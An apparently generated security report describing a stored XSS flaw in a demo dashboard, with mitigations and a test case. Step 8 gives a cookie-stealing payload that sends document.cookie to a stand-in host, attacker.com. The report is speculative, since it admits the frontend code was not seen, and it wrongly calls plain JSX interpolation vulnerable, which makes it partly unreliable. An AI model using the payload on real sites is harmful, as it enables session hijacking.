- Vulnerability name: Stored Cross-Site Scripting (XSS) vulnerability in Demo Dashboard
- Description:
    1. An attacker identifies an input field or functionality within the demo dashboard that allows users to input text data (e.g., model name, data description, user feedback form).
    2. The attacker crafts a malicious payload containing JavaScript code. For example: `<script>alert("XSS Vulnerability");</script>`.
    3. The attacker submits this malicious payload through the identified input field or functionality.
    4. The demo dashboard stores this malicious payload in its data storage (potentially in the browser's local storage, or a backend database if implemented).
    5. When another user (or the attacker themselves) accesses a part of the demo dashboard that displays the stored data containing the malicious payload, the JavaScript code is executed by the user's browser.
    6. This occurs because the demo dashboard fails to properly sanitize or encode the stored data before rendering it in the HTML context.
- Impact:
    - **Account Compromise:** An attacker could steal session cookies, allowing them to hijack user accounts and perform actions on behalf of legitimate users.
    - **Data Theft:** Malicious scripts can be used to extract sensitive information displayed on the dashboard or accessible through the user's session and send it to an attacker-controlled server.
    - **Malware Distribution:** The XSS vulnerability could be leveraged to redirect users to malicious websites or inject malware into their systems.
    - **Defacement:** Attackers could alter the appearance of the dashboard, displaying misleading or harmful content to other users.
    - **Denial of Service (Indirect):** By injecting resource-intensive scripts, an attacker could degrade the performance of the dashboard for other users.
- Vulnerability rank: High
- Currently implemented mitigations:
    - There are no currently implemented mitigations visible in the provided project files for XSS vulnerabilities within the demo dashboard's frontend code. The provided files focus on backend logic, smart contracts, and simulation aspects rather than frontend security measures.
- Missing mitigations:
    - **Input Sanitization:** Implement robust input sanitization on the server-side (if a backend service is used to store dashboard data) to remove or neutralize potentially malicious code before storing user-provided data.
    - **Output Encoding:**  Employ proper output encoding (e.g., HTML entity encoding) in the frontend React code when rendering user-provided or data fetched from backend/blockchain in HTML. This ensures that any potentially malicious characters are displayed as text and not executed as code. Libraries like `DOMPurify` can be used for sanitizing HTML content in React.
    - **Content Security Policy (CSP):** Implement a Content Security Policy to restrict the sources from which the dashboard can load resources (scripts, stylesheets, images, etc.). This can significantly reduce the impact of XSS attacks by limiting the actions an attacker can perform even if they manage to inject malicious scripts.
    - **Regular Security Audits and Penetration Testing:** Conduct regular security audits and penetration testing specifically targeting the demo dashboard's frontend to identify and address XSS vulnerabilities proactively.
- Preconditions:
    - A user with malicious intent needs to be able to interact with the demo dashboard and input text data into a field that is subsequently displayed to other users without proper sanitization.
    - The demo dashboard must store the user-provided data and render it in a way that allows JavaScript execution.
    - Users must access the vulnerable part of the demo dashboard after the malicious payload has been stored.
- Source code analysis:
    - As the provided files do not include the frontend code for the demo dashboard, a direct source code analysis to pinpoint the vulnerable location is not possible.
    - However, based on typical React frontend structures and common XSS vulnerability patterns, the vulnerability is likely to be in React components responsible for:
        - Displaying user-generated content or data fetched from an API/blockchain.
        - Using functions like `dangerouslySetInnerHTML` without careful sanitization, which is a common source of XSS in React if used improperly.
        - Rendering data directly from state or props into JSX without proper encoding.
    - Example of potentially vulnerable React code snippet (hypothetical):
      ```jsx
      function DataDisplay({ userData }) {
        return (
          <div>
            <h1>User Data:</h1>
            <div>
              {/* Vulnerable code - directly rendering userData without encoding */}
              <p>{userData}</p>
            </div>
          </div>
        );
      }
      ```
      or using `dangerouslySetInnerHTML`:
      ```jsx
      function DataDisplay({ userDataHTML }) {
        return (
          <div>
            <h1>User Data:</h1>
            {/* Vulnerable code - using dangerouslySetInnerHTML without sanitization */}
            <div dangerouslySetInnerHTML={{ __html: userDataHTML }} />
          </div>
        );
      }
      ```
- Security test case:
    1. Deploy the demo dashboard locally or access a publicly deployed instance if available.
    2. Identify an input field within the dashboard (e.g., a field to name a model, add a description to data, or a feedback/comment section).
    3. In the identified input field, enter the following XSS payload: `<script>alert('XSS Vulnerability Test');</script>`.
    4. Submit the input.
    5. Navigate to the dashboard page where the entered data is displayed. This might be a model details page, a data listing, or a user profile page depending on the dashboard's functionality.
    6. Observe if an alert box with the message "XSS Vulnerability Test" appears in your browser when the page loads or when interacting with the element displaying the injected data.
    7. If the alert box appears, it confirms the presence of a Stored XSS vulnerability.
    8. To further test cookie theft, use the payload: `<script>document.location='http://attacker.com/cookie_steal.php?cookie='+document.cookie</script>` (replace `http://attacker.com/cookie_steal.php` with a server you control to capture cookies). Observe if your cookies are sent to the attacker's server when you access the page displaying the injected data.
    9. If cookies are successfully sent, it further validates the XSS vulnerability and demonstrates a higher severity impact.
